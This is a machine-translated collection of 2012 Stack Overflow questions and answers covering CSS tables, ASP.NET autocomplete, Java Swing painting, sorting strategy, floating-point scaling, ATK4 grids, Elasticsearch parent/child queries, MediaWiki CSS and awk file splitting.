    padding: 5px 10px;
    list-style: none;
    border: 1px solid #C9C9C9;
    vertical-align: top;
}
.table ul li.title {
    font-weight: bold;
}
.table ul li.delete, .table ul li.delete input[type=checkbox] {
    width: 20px;
}
.table ul li.result.delete {
    padding: 5px 10px;
}
.table input[type=submit] {
    float: left;
    width: auto;
    height: 29px;
    margin-top: 10px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    -o-border-radius: 5px;
    -khtml-border-radius: 5px;
    border-radius: 5px;
}
.table ul li.title, .table ul li.result {
    display: inline-block;
}
.table ul li.last_replier {
    width: 140px;
}
.table ul li.subject {
    width: 315px;
}
.table ul li.status, .table ul li.category {
    width: 120px;
}
.table a {
    text-decoration: none;
    margin: 0;
    padding: 0;
}

.list-emails-table {
    width: 900px;
}
.list-emails-table ul li.status {
    width: 80px;
}​ 
```

HTML：

```
<div class="table list-emails-table">
  <ul><li class="title delete">&nbsp;</li><li class="title category">Category</li><li class="title last_replier">Last Replier</li><li class="title subject">Subject</li><li class="title status">Status</li></ul>
  <ul><li class="result delete"><input type="checkbox" name="action[]" id="checkbox[]" value=""></li><a href=""><li class="result category">Info</li><li class="result last_replier">Somebodys Name</li><li class="result subject">Short Text</li><li class="result status">Status Here</li></a></ul>
  <ul><li class="result delete"><input type="checkbox" name="action[]" id="checkbox[]" value=""></li><a href=""><li class="result category">Info</li><li class="result last_replier">Somebodys Name</li><li class="result subject">Long Text - Long Text - Long Text - Long Text - Long Text - Long Text</li><li class="result status">Status Here</li></a></ul>
  <ul><li class="result delete"><input type="checkbox" name="action[]" id="checkbox[]" value=""></li><a href=""><li class="result category">Info</li><li class="result last_replier">Somebodys Name</li><li class="result subject">Short Text</li><li class="result status">Status Here</li></a></ul>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:05:46.253

一个快速的破解和修复解决方案（只需在列表中查找并替换您的列表，并使用诚实至善的表格）。`display: table`使用,`display: table-row`和可以达到相同的效果`display: table-cell`，但`<table>`在这种情况下 a 更具语义。

[http://jsfiddle.net/U8WaH/17/](http://jsfiddle.net/U8WaH/17/)

```
.table {
    margin: 0 auto;
}
.table tr td {
    margin: 0;
    padding: 5px 10px;
    list-style: none;
    border: 1px solid #C9C9C9;
    vertical-align: top;
}
.table tr td.title {
    font-weight: bold;
}
.table tr td.delete, .table tr td.delete input[type=checkbox] {
    width: 20px;
}
.table tr td.restrt.delete {
    padding: 5px 10px;
}
.table input[type=submit] {
    float: left;
    width: auto;
    height: 29px;
    margin-top: 10px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    -o-border-radius: 5px;
    -khtml-border-radius: 5px;
    border-radius: 5px;
}
.table tr td.last_reptder {
    width: 140px;
}
.table tr td.subject {
    width: 315px;
}
.table tr td.status, .table tr td.category {
    width: 120px;
}
.table a {
    text-decoration: none;
    margin: 0;
    padding: 0;
}
.tdst-emails-table {
    width: 900px;
}
.tdst-emails-table tr td.status {
    width: 80px;
} 
```

```
<table class="table tdst-emails-table">
  <tr><td class="title delete">&nbsp;</td><td class="title category">Category</td><td class="title last_reptder">Last Reptder</td><td class="title subject">Subject</td><td class="title status">Status</td></tr>
  <tr><td class="restrt delete"><input type="checkbox" name="action[]" id="checkbox[]" value=""></td><td class="restrt category">Info</td><td class="restrt last_reptder">Somebodys Name</td><td class="restrt subject">Short Text</td><td class="restrt status">Status Here</td></tr>
  <tr><td class="restrt delete"><input type="checkbox" name="action[]" id="checkbox[]" value=""></td><td class="restrt category">Info</td><td class="restrt last_reptder">Somebodys Name</td><td class="restrt subject">Long Text - Long Text - Long Text - Long Text - Long Text - Long Text</td><td class="restrt status">Status Here</td></tr>
  <tr><td class="restrt delete"><input type="checkbox" name="action[]" id="checkbox[]" value=""></td><td class="restrt category">Info</td><td class="restrt last_reptder">Somebodys Name</td><td class="restrt subject">Short Text</td><td class="restrt status">Status Here</td></tr>
</table> 
```

# c# - 预测搜索不起作用？

> ID：11806575
> 
> 赞同：0
> 
> 时间：2012-08-04T06:46:41.880
> 
> 标签：c#, asp.net, search, textbox

这是aspx文件代码。

```
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
<title>AutoComplete Box with jQuery</title>
<link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.1/themes/base/jquery-ui.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.1/jquery-ui.min.js"></script> 
<script type="text/javascript">
    $(document).ready(function () {
        SearchText();
    });
    function SearchText() {
        $(".autosuggest").autocomplete({
            source: function (request, response) {
                $.ajax({
                    type: "POST",
                    contentType: "application/json; charset=utf-8",
                    url: "Default.aspx/GetAutoCompleteData",
                    data: "{'username':'" + document.getElementById('txtSearch').value + "'}",
                    dataType: "json",
                    success: function (data) {
                        response(data.d);
                    },
                    error: function (result) {
                        alert("Error");
                    }
                });
            }
        });
    }
</script>
</head>
<body>
<form id="form1" runat="server">
<div class="demo"></div>
<div class="ui-widget">
<label for="tbAuto">Enter UserName: </label>
<input type="text" id="txtSearch" class="autosuggest" />
</div>
</form>
</body>
</html> 
```

这是 .cs 文件代码。

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.SqlClient;
using System.Data;
using System.Web.Services;

public partial class demo : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

    }
     public static string getconnectionstring()
    {
        return System.Configuration.ConfigurationManager.ConnectionStrings["crudconnection"].ConnectionString;
    }
    public static List<string> GetAutoCompleteData(string username)
    {
        List<string> result = new List<string>();
        SqlConnection con = new SqlConnection(getconnectionstring();

            using (SqlCommand cmd = new SqlCommand("select DISTINCT username from crudtable where username LIKE '%'+@SearchText+'%'", con))
            {
                con.Open();
                cmd.Parameters.AddWithValue("@SearchText", username);
                SqlDataReader dr = cmd.ExecuteReader();
                while (dr.Read())
                {
                    result.Add(dr["username"].ToString());
                }
                return result;
            }

    }
} 
```

数据库“crud”具有“crudtable”列（用户名、名字、姓氏、地址、id）。当我在文本框中输入任何内容并按下按钮时，搜索不起作用。一切似乎都是正确的，但不知道错误在哪里。

帮助朋友。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:15:13.437

问题出在这行代码

```
cmd.Parameters.AddWithValue("@SearchText", username); 
```

不要在参数名称中添加@。利用

```
cmd.Parameters.AddWithValue("SearchText", username); 
```

其次添加一个断点并检查您的代码是否被 ajax 调用命中。

# java - Java 中的图形类是如何工作的？

> ID：11806576
> 
> 赞同：3
> 
> 时间：2012-08-04T06:46:47.130
> 
> 标签：java, swing, graphics, paintcomponent

最近，我一直在尝试用图形来做一些 Java 工作。现在 Graphics 类是抽象的，这意味着它本身不能被实例化，但它的子类可能能够被实例化。那么下面的代码中发生了什么。（确实成功创建了一条线）

```
import javax.swing.*;
import java.awt.*;

public class line extends JPanel {
    public void paintComponent(Graphics g) {
        g.drawLine(0, 0, 90, 90);
    }

    public static void main(String[] args) {
        JFrame jf = new JFrame();
        jf.add(new line());
        jf.setSize(500, 500);
        jf.setVisible(true);
    }
} 
```

好吧，现在有些事情对我来说没有意义。首先，当 line 被调用时，它必须在 line 类中制定 paintComponent 方法。这是静态方法的一个属性（使用类名调用）。但是paintComponent 方法没有静态修饰符。

由于这个程序可以工作，尽管我们必须假设 paintComponent 确实被调用并期望一个 Graphics 对象作为参数。当它被调用时，虽然它没有参数。为什么这不会产生错误？我通过传入一个字符串运行了一些测试，然后没有任何东西进入一个期望一个整数对象的方法。我在两个程序上都有错误。

因此，不知何故创建了一个名为 g 的图形对象，并使用了 drawline 方法。但是图形是抽象的。

好的，这是我的问题：

1.  为什么在paintComponent不是静态的情况下调用它的类行时会自动调用paintComponent？

2.  为什么 paintComponent 在需要 Graphics 对象时接受空参数？

3.  由于 Graphics 类是抽象的且无法实例化，因此如何制作 Graphics 对象 g？

帮助我 Stack Overflow，你是我唯一的希望。

编辑：好的，我认为这个问题很好回答，谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T07:13:49.223

1.  当 AWT 决定是时候绘制窗口时调用paintComponent（在大多数情况下，因为操作系统向它发送一条消息告诉它这样做）。当它绘制 JFrame 时，它​​会遍历其中的对象树。其中是您的 line 实例，因为您使用 jf.add(new Line()) 调用添加了它。在其中的每一个上都会调用paintComponent 方法。

2.  它不接受空参数。

3.  当 AWT 调用paintComponent 时，它传递一个从Graphics 继承的具体类的实例。

签名paintComponent(Graphics g) 并没有说参数应该是Graphics 类型。但实际上说它应该是 Graphics 类型或从 Graphics 继承的任何类。另一种看待它的方式是说任何从 Graphics 继承的类也是 Graphics 类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-03T04:35:14.797

您必须知道的是，paintComponent() 仅由 AWT 调用，而不是您第一次调用。但是“repaint()”方法是可以使用的，因为它在内部调用paintComponent() 来更新图形。图形对象也是由 Graphics 的内部子类创建的。所以在调用paintComponent() 之前，AWT 创建扩展Graphics 的类的对象（假设g）。之后，AWT 通过传递“g”对象调用您定义的paintCompoent()。

这与方法 actionPerformed() 对侦听器的作用相同。你只是定义它，但你实际上并不知道它在哪里被调用。实际上，这些是由 JVM（Java 虚拟机）执行的任务：

```
jbutton.addActionListener(new ActionListener(){
   public void actionPerformed(ActionEvent e){
      //Do sth on button click.
   }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-02T11:14:46.210

在小程序内的屏幕上绘制线条、形状、字符和图像。Java 中的大多数图形操作都是在[Graphics 类](http://thatsjavainfo.com/java/java-graphics-class/)中定义的方法。您不必为了在您的小程序中绘制某些东西而创建 Graphics 的实例；在您的小程序的 paint() 方法中，您将获得一个 Graphics 对象。通过在该对象上绘图，您可以在小程序上绘图，结果会出现在屏幕上。Graphics 类是 java.awt 包的一部分，因此如果您的小程序进行任何绘画（通常会这样），请确保在 Java 文件的开头导入该类............ ...

# algorithm - 我们应该对这两个列表进行排序然后合并，还是反过来？

> ID：11806577
> 
> 赞同：0
> 
> 时间：2012-08-04T06:46:56.537
> 
> 标签：algorithm

如果我有两个数字列表，为了能够获得单个排序列表，我应该先对单个数字进行排序然后进行合并排序，还是应该将两个列表合并为一个列表，然后应用有效的排序算法?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:04:51.130

无论哪种方式，您都可以提出论点；这取决于许多因素：

列表 A 和 B 的选项是：

1.  排序（A 连接 B）
2.  合并（排序（A），排序（B））

如果 A 和 B 几乎都已排序且大小相似，那么可以在两者上都执行在几乎已排序的列表上快速运行的操作，例如插入排序。然后你进行合并，这需要线性时间，使选项（2）接近线性。但在这种情况下，如果每个列表中的值范围相似，则选项 (1) 根本不会好，给你留下可能 O(n log n) 的东西，假设你的值不适合基数或计数种类。也就是说，对于许多排序算法，较长的列表会受到伤害，因为数据移动的距离更长。

现在我们可能会想出选项（1）更好的情况。

但是，如果您发现选项 (2) 在您的情况下总是更好，这并不*意味着*您应该天真地应用递归拆分和合并方法，因为这样做会产生开销。

但就像所有关于“哪种排序方法更好”的问题一样，你真的必须看看：

*   列表的大小
*   列表中值的范围（最小值，最大值）（因为在某些情况下可以使用 O(n) 排序）
*   无论它们是接近排序的、接近反向排序的、完全随机的还是其他
*   是否允许、禁止外部存储器等。
*   无论您是在内存中排序还是对文件进行排序
*   列表的大小是否大致相同，或者一个比另一个长得多。

简而言之，“视情况而定”，但如果列表已经拆分并且您的排序算法对列表长度敏感，那么您可以从选项 (2) 中获得一些好处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:49:51.187

如果它们尚未排序，我只需将它们组合起来并进行一次排序。如果将它们分别排序然后进行合并排序更有效，那么最有效的排序算法将这样构建：任意将列表一分为二，分别排序并合并。但事实并非如此，所以......

# c++ - 用于双精度加法和乘法的常量形式

> ID：11806581
> 
> 赞同：5
> 
> 时间：2012-08-04T06:47:55.363
> 
> 标签：c++, c, optimization, underflow

我需要在循环中有效地将一些常量添加或乘以 double 类型的结果，以防止下溢。例如，如果我们有 int，则乘以 2 的幂将很快，因为编译器将使用位移位。是否有一种形式的常数可以有效地进行`double`加法和乘法？

编辑：似乎没有多少人理解我的问题，为我的草率道歉。我将添加一些代码。如果`a`是 int，这（乘以 2 的幂）会更有效

```
int a = 1;
for(...)
    for(...)
        a *= somefunction() * 1024; 
```

与将 1024 替换为 1023 相比。如果我们想添加到 int，不确定什么是最好的，但这不符合我的兴趣。我对`a`双倍的情况感兴趣。我们可以有效地添加**和**乘以双精度**数的常数形式**（例如 2 的幂）是什么？常数是**任意**的，只需要足够大以防止下溢。

 ****这可能不仅限于 C 和 C++，但我不知道更合适的标签。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T10:38:55.227

在大多数现代处理器上，简单地乘以 2 的幂（例如，`x *= 0x1p10;`乘以 2 ^(10)或`x *= 0x1p-10;`除以 2 ^(10)）将是快速且无错误的（除非结果大到足以溢出或小到足以下溢）。

对于某些浮点运算，有些处理器具有“提前输出”功能。也就是说，当某些位为零或满足其他标准时，它们会更快地完成指令。但是，浮点加法、减法和乘法通常在大约四个 CPU 周期内执行，因此即使没有提前输出，它们也相当快。此外，大多数现代处理器一次执行多条指令，因此在乘法发生时其他工作会继续进行，并且它们是流水线的，因此通常可以在每个 CPU 周期中开始（并结束）一次乘法运算。（有时更多。）

乘以 2 的幂没有舍入误差，因为有效数字（值的小数部分）不会改变，因此新有效数字是完全可表示的。（除了乘以小于 1 的值，有效位数的位可能会被压低到浮点类型的限制以下，导致下溢。对于常见的 IEEE 754 双精度格式，直到值小于才会发生这种情况0x1p-1022。）

不要使用除法进行缩放（或反转先前缩放的效果）。相反，乘以倒数。（要删除之前的 0x1p57 缩放，乘以 0x1p-57。）这是因为除法指令在大多数现代处理器上都很慢。例如，30 个周期并不罕见。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T14:53:37.027

在现代处理器中，浮点加法和乘法通常需要几个周期。

也许你应该退后一步，想想算法在做什么。在您的示例中，您有一个双重嵌套循环......这意味着“somefunction()”可能会被多次调用。“double”的常见表示形式是 IEEE，它使用 11 位作为指数，52 位作为尾数（实际上是 53，因为除了零之外还有一个隐含的“1”）。这意味着您可以将数字表示为 53 位精度，范围从非常小的数字到非常大的数字 - 二进制“浮点”可以将 1024 (2^10) 位移动到数字 "1.0" 的左侧或右侧。 .. 如果“somefunction()”被调用一千次，它总是返回一个小于或等于 0.5 的数字，你就会下溢（每次乘以 0.5，你的数字“a”就会减半，这意味着您将二进制浮点数向左移动。在 x86 上，您可以通过在控制寄存器中设置一个位来告诉处理器“将非规范化刷新为零” - 没有可移植的编程接口用于执行此操作，您使用 gcc

```
_MM_SET_FLUSH_ZERO_MODE(_MM_FLUSH_ZERO_ON); 
```

告诉处理器将非正常值刷新为零将使您的代码运行得更快，因为处理器不会尝试表示超出（小于）正常值（次正常值或非正常值）的数字。面对产生次法线的算法（这会导致精度损失），您似乎正试图保持精度。如何最好地处理这个取决于你是否控制“somefunction()”。如果您确实可以控制该函数，那么您可能会将它返回的值“标准化”为范围内的某个值

```
0.5 <= X <= 2.0 
```

换句话说，返回值以 1.0 为中心，并单独跟踪 2 的幂，您需要乘以最终答案以正确缩放它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-04T06:50:16.010

首先让你的双精度并选择**“范围”**和**“指数”**部分。然后只移动**“指数”**或**“范围”**部分。寻找 IEEE 浮点标准。不要忘记符号和**最后的尾数位**。

```
union int_add_to_double
{
double this_is_your_double_precision_float;
struct your_bit_representation_of_double
    {
    int range_bit:53;//you can shift this to make range effect
    //i dont know which is mantissa bit. maybe it is first of range_bit. google it.
    int exponent_bit:10;   //exponential effect
    int sign_bit:1;     //take negative or positive
    }dont_forget_struct_name;
}and_a_union_name; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-04T15:12:08.803

如果您使用的是 SSE，直接向指数字段添加常量是一个合法的技巧（在 FPU 代码中这非常糟糕） - 它通常具有两倍的吞吐量和 4 倍的延迟（除了具有 float->int 的处理器和/或 int->float 惩罚）。但既然您这样做只是为了防止非正规化，为什么不打开 FTZ（刷新为零）和 DAZ（非正规化为零）？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-04T06:54:40.043

您可以使用将 IEE 754 值分解为其组件的标准 frexp/ldexp 函数：

[http://www.cplusplus.com/reference/clibrary/cmath/freexp/](http://www.cplusplus.com/reference/clibrary/cmath/frexp/)

[http://www.cplusplus.com/reference/clibrary/cmath/ldexp/](http://www.cplusplus.com/reference/clibrary/cmath/ldexp/)

这是一个简单的示例代码：

```
#include <cmath>
#include <iostream>

int main ()
{
  double value = 5.4321;
  int exponent;

  double significand = frexp (value , &exponent);
  double result = ldexp (significand , exponent+1);

  std::cout << value << " -> " << result  << "\n";
  return 0;
} 
```

执行处理：http: [//ideone.com/r3GBy](http://ideone.com/r3GBy)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-04T14:03:31.123

在千兆赫处理器上，您可以通过优化这种方式（移位与算术）节省 1 或 2 纳秒。但是，从内存加载和存储所需的时间约为 100 纳秒，而到磁盘则为 10 毫秒。与优化缓存使用和磁盘活动相比，担心算术运算是没有意义的。它永远不会对任何实际的生产程序产生影响。

只是为了防止误解，我并不是说差异很小，所以不要担心，我是说它为零。您不能编写一个简单的程序，其中 ALU 时间的差异与 CPU 停止等待内存或 I/O 的时间不完全重叠。****

# atk4 - 如何在 ATK4 中修改 CRUD 中 MVCGrid 按钮的行为

> ID：11806582
> 
> 赞同：1
> 
> 时间：2012-08-04T06:47:54.857
> 
> 标签：atk4, mvcgrid

在我的站点中，我有一个页面旨在处理用于错误跟踪和功能请求的基本票证系统。我需要一个网格来显示当前打开的请求，并带有一个允许用户添加新请求的按钮。我还希望每一行都有一个名为“详细信息”的按钮，该按钮将打开一个新页面或弹出一个包含历史记录的框架（不介意哪个），例如日期、时间和错误/问题的任何评论、状态更新或评论和一个简单的表格，以允许用户添加新的回复。

到目前为止，我创建了一个添加 CRUD 的页面，并使用 addColumn('button','detail') 为每一行添加了一个按钮。

![在此处输入图像描述](../Images/ed1143f82a0166597695576fb6dc412c.png)

并且创建它的 ATK4 代码像这样优雅地简短

```
 <?php
  class page_ticket extends Page {
     function init() {
     parent::init();
     $p=$this;

     $team=$this->api->getTeamID();

     if (isset($_GET['detail'])) {
       $ticket=$_GET['detail'];
       $p->add('HtmlElement',null, 'crud')->setElement('h2')->set('Ticket History - ['.$ticket.']');
     } else {

       $tk=$p->add('CRUD_Ticket', null, 'crud');
       $m=$tk->setModel('Ticket', array('name', 'submit_date', 'status','ticket_type_id', 'urgency_id','description');

       $m->addCondition('status','TKO');

       $open=$this->api->db->dsql()->table('vscrum_ticket')
                  ->field('count(*)')
                  ->where('team_id',$team)
                  ->where('status','TKO')
                  ->do_getOne();
       ..   ..   ..

       $tk->grid->addQuickSearch(array('name'));
       $tk->grid->addPaginator(12);
  }

  $this->template->set('open_tickets', $open);
 } //End else detail
}

function defaultTemplate(){
    return array('page/ticket');
} 
```

}

但问题是我无法确定处理按钮的默认功能的位置。目前，默认情况下，它会打开传递参数的同一页面 (ticket.php)，但会打开一个新窗口并给出 Ajax 错误，如图所示。

![在此处输入图像描述](../Images/0ef4d05621b57c36b6f990ab69a83158.png)

我在页面和错误窗口中包含了 if then else ，它正确显示了我的输出，即按下详细信息按钮的行的票证 ID。我可以稍后添加其他细节，但为什么它在新窗口中打开它而不是在框架中加载它？

我认为这是 CRUD 的默认功能，因为按钮通常是编辑或删除的，但我该如何覆盖它？

如果我想打开一个不同的页面，而不是同一个页面，我认为这也与覆盖使用 javascript frameURL 函数打开一个框架的 MVCGrid 按钮的默认功能有关。

CRUD 看起来像这样

```
 <?php
class CRUD_Ticket extends View {
    public $form=null;
    public $grid=null;

    public $grid_class='MVCGrid';
    public $form_class='MVCForm';

    public $frame_options=null;
    function init(){
    parent::init();

    if(isset($_GET[$this->name])){
        $this->api->stickyGET($this->name);

        $this->form=$this->add($this->form_class);
        $_GET['cut_object']=$this->name;

        return;
    }

    $this->grid=$this->add($this->grid_class);
    $this->js('reload',$this->grid->js()->reload());
    $this->add_button = $this->grid->addButton('Add Ticket');
    $this->add_button->js('click')->univ()
        ->frameURL('Add Ticket',$this->api->getDestinationURL(null,array($this->name=>'new')),$this->frame_options);

    }

    function setModel($a,$b=null){
    if($this->form){
        $m=$this->form->setModel($a,$b);

        if(($id=$_GET[$this->name])!='new'){
        $m->loadData($id);
        }

        if($this->form->isSubmitted()){
        $this->form->update(); 
                    $this->form->js(null,$this->js()
                         ->trigger('reload'))->univ()->closeDialog()->execute();
        }
        return $m;
    }
    $m=$this->grid->setModel($a,$c);

    $this->grid->addColumn('button','detail');
    if($id=@$_GET[$this->grid->name]){
        $this->js()->univ()->frameURL('Ticket History',$this->api->getDestinationURL(
                    null,array($this->name=>$id)))->execute();
    }
    return $m;
    }
} 
```

我尝试将 CRUD 中对 frameURL 的调用更改为

```
 $this->js()->univ()->page('ticketdtl',array($this->name=>$id)); 
```

和

```
 $this->js()->univ()->location($this->api->getDestinationURL('tktdetail',array($this->name=>$id)) 
```

但是这些也不起作用，因为它仍然重定向到原始页面，所以我认为它必须是需要在某个地方覆盖的默认功能 - 只是不知道在哪里？

[回到此处](http://agiletoolkit.org/whatsnew/may2011)的agiletoolkit.org 页面并意识到将按钮添加到网格（B1 和B2）的演示也表现出相同的行为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:44:26.523

Agile Toolkit Grid 中的按钮发送一个请求，请求一些 JavaScript 响应。当该响应到达时，它可以打开一个框架。因此，您需要执行两个请求而不是一个请求。

我在这里包含了一个工作示例：

[http://agiletoolkit.org/codepad/gui/grid#GridButton](http://agiletoolkit.org/codepad/gui/grid#GridButton)

# parent-child - 在弹性搜索查询中将子项视为父项的字段

> ID：11806584
> 
> 赞同：21
> 
> 时间：2012-08-04T06:48:32.523
> 
> 标签：parent-child, elasticsearch

我正在阅读 elasticsearch 的文档，这个 [page][1] 讨论了使用`_parent`.

如果我有孩子叫`email`依附于父母叫`account`：

每种类型的字段：

```
account (http://localhost:9200/myapp/account/1)
========
id
name
some_other_info
state

email (http://localhost:9200/myapp/email/1?parent=1)
========
id
email 
```

*   如果of是，我如何搜索`name`字段`account`和`email`字段？`email``state``account``active`

*   有没有办法让父母拥有的所有孩子（某种类型或任何类型）？

*   索引子文档时，是否可以将父文档作为 JSON 数据中的对象属性传递，而不是将其作为查询字符串的一部分？

* * *

在尝试了 imotov 的建议后，我想出了这个查询：

这是在执行`http://localhost:9200/myapp/account/_search`

```
{
  "query": {
    "bool": {
      "must": [
        {
          "prefix": {
            "name": "a"
          }
        },
        {
          "term": {
            "statuses": "active"
          }
        }
      ],
      "should": [
        {
          "has_child": {
            "type": "emailaddress",
            "query": {
              "prefix": {
                "email": "a"
              }
            }
          }
        }
      ]
    }
  }
} 
```

问题是上面没有给我任何与电子邮件匹配的帐户。

我想要的效果基本上是这样的：

*   有一个搜索框
*   用户开始输入，搜索框自动完成。
*   用户的查询将根据类型的名称`account`或任何`emailaddress`类型的名称进行检查。
*   如果`accounts`匹配，只需返回它们。如果`emailaddress`匹配，则返回其父帐户。
*   每次搜索最多限制为 x 个（比如 10 个）帐户。

所以，我基本上需要能够`OR`在 2 种类型之间进行搜索并返回匹配的父类型。

* * *

测试数据：

```
curl -XPUT http://localhost:9200/test/account/1 -d '{
    "name": "John Smith",
    "statuses": "active"
}'

curl -XPUT http://localhost:9200/test/account/2 -d '{
    "name": "Peter Smith",
    "statuses": "active"
}'

curl -XPUT http://localhost:9200/test/account/3 -d '{
    "name": "Andy Smith",
    "statuses": "active"
}'

//Set up mapping for parent/child relationship

curl -XPUT 'http://localhost:9200/test/email/_mapping' -d '{
    "emails" : {
        "_parent" : {"type" : "account"}
    }
}'

curl -XPUT http://localhost:9200/test/email/1?parent=1 -d '{
    "email": "john@smith.com"
}'

curl -XPUT http://localhost:9200/test/email/2?parent=1 -d '{
    "email": "admin@mycompany.com"
}'

curl -XPUT http://localhost:9200/test/email/3?parent=1 -d '{
    "email": "abcd@efg.com"
}'

curl -XPUT http://localhost:9200/test/email/4?parent=2 -d '{
    "email": "peter@peter.com"
}'

curl -XPUT http://localhost:9200/test/email/5?parent=3 -d '{
    "email": "andy@yahoo.com"
}'

curl -XPUT http://localhost:9200/test/email/6?parent=3 -d '{
    "email": "support@mycompany.com"
}' 
```

* * *

imotov 的解决方案对我有用。我发现的另一个解决方案是查询`account`s `status = active`，然后对结果运行`bool`过滤器并`has_child`在子类型和过滤`prefix`器`name`内部使用`bool`。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-05T19:21:44.970

elasticsearch 和关系数据库之间的一个重要区别是elasticsearch 不能执行连接。在弹性搜索中，您总是在搜索单个索引或索引联合。但是在父/子关系的情况下，可以使用对子索引的查询来限制父索引中的结果。例如，您可以对`account`类型执行此查询。

```
{
    "bool": {
        "must": [
            { 
                "text" : { "name": "foo" } 
            }, { 
                "term" : { "state": "active" } 
            }, {
                "has_child": {
                    "type": "email",
                    "query": {
                        "text": {"email": "bar" }
                    }
                }
            }
        ]
    }
} 
```

此查询将只返回父文档（不会返回子文档）。您可以使用此查询返回的父 id 来查找此父项的所有子项，该字段使用`_parent`默认存储和索引的字段。

```
{
    "term" : { "_parent": "1" } 
} 
```

或者，您可以将结果限制为仅包含`bar`字段中的单词的子项`email`：

```
{
    "bool": {
        "must": [
            { 
                "term" : { "_parent": "1" } 
            }, { 
                "text" : { "email": "bar" } 
            }
        ]
    }
} 
```

[除非您使用_bulk indexing](http://www.elasticsearch.org/guide/reference/api/bulk.html)，否则我认为不可能在 json 中指定父级。

这是使用问题中提供的测试数据实现电子邮件查找的方式：

```
#!/bin/sh
curl -XDELETE 'http://localhost:9200/test' && echo 
curl -XPOST 'http://localhost:9200/test' -d '{
    "settings" : {
        "number_of_shards" : 1,
        "number_of_replicas" : 0
    },
    "mappings" : {
      "account" : {
        "_source" : { "enabled" : true },
        "properties" : {
          "name": { "type": "string", "analyzer": "standard" },
          "statuses": { "type": "string",  "index": "not_analyzed" }
        }
      },
      "email" : {
        "_parent" : {
          "type" : "account"
        },
        "properties" : {
          "email": { "type": "string",  "analyzer": "standard" }
        }
      }
    }
}' && echo

curl -XPUT 'http://localhost:9200/test/account/1' -d '{
    "name": "John Smith",
    "statuses": "active"
}'

curl -XPUT 'http://localhost:9200/test/account/2' -d '{
    "name": "Peter Smith",
    "statuses": "active"
}'

curl -XPUT 'http://localhost:9200/test/account/3' -d '{
    "name": "Andy Smith",
    "statuses": "active"
}'

//Set up mapping for parent/child relationship

curl -XPUT 'http://localhost:9200/test/email/1?parent=1' -d '{
    "email": "john@smith.com"
}'

curl -XPUT 'http://localhost:9200/test/email/2?parent=1' -d '{
    "email": "admin@mycompany.com"
}'

curl -XPUT 'http://localhost:9200/test/email/3?parent=1' -d '{
    "email": "abcd@efg.com"
}'

curl -XPUT 'http://localhost:9200/test/email/4?parent=2' -d '{
    "email": "peter@peter.com"
}'

curl -XPUT 'http://localhost:9200/test/email/5?parent=3' -d '{
    "email": "andy@yahoo.com"
}'

curl -XPUT 'http://localhost:9200/test/email/6?parent=3' -d '{
    "email": "support@mycompany.com"
}'

curl -XPOST 'http://localhost:9200/test/_refresh'
echo
curl 'http://localhost:9200/test/account/_search' -d '{
  "query": {
    "bool": {
      "must": [
        {
          "term": {
            "statuses": "active"
          }
        }
      ],
      "should": [
        {
          "prefix": {
            "name": "a"
          }
        },
        {
          "has_child": {
            "type": "email",
            "query": {
              "prefix": {
                "email": "a"
              }
            }
          }
        }
      ],
      "minimum_number_should_match" : 1
    }
  }
}' && echo 
```

# mediawiki - 使 MediaWiki 不为未注册用户显示查看历史选项卡

> ID：11806587
> 
> 赞同：3
> 
> 时间：2012-08-04T06:49:01.050
> 
> 标签：mediawiki

我有个问题。如何让 mediawiki 不为注销用户显示 [查看历史记录] 选项卡？我知道您可以使用 css 来做到这一点：在 Mediawiki:common.css 中：

```
#ca-talk { display:none!important; }
#ca-history { display:none!important; } 
```

但它适用于所有人，甚至是登录用户，所以我想有一种方法让它只是未注册的用户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T19:22:44.920

显然，如果您正在运行 MediaWiki 1.18 或更新版本，您可以添加仅为特定用户组加载的 CSS。有关更多信息，请参阅[手册页](http://www.mediawiki.org/wiki/Manual%3aUser_group_CSS_and_Javascript)。所以你应该能够添加：

```
#ca-talk { display:none!important; }
#ca-history { display:none!important; } 
```

到 MediaWiki:Common.css 然后添加：

```
#ca-talk { display:block!important; }
#ca-history { display:block!important; } 
```

到 MediaWiki:Group-user.css。第二组规则仅适用于登录用户。

# shell - 如何在awk中对文件进行排序

> ID：11806592
> 
> 赞同：-1
> 
> 时间：2012-08-04T06:49:58.980
> 
> 标签：shell, sorting, awk

我有一个小问题。我需要根据文件的某个起始字符串对文件进行排序。例如，根据数字 04、05 或 06 在这种形式中：

```
04..............
................
................
05..............
................
................
06..............
................
................ etc.. 
```

这是我的 awk 代码： http: [//pastebin.com/dLsWkV3q](http://pastebin.com/dLsWkV3q)

或者就在这里：

```
echo "starting...input file"
read file
echo "reading file..."                                                  

echo "... now sorting..."
cat $file | awk '{
if($1=="04"){
print >> "04_file.txt";
}
if($1=="05"){
print >> "05_file.txt";
 }

if($1=="06"){
print >> "06_file.txt";
 }
}'

echo "finished, bye?"
read wait
echo "bye" 
```

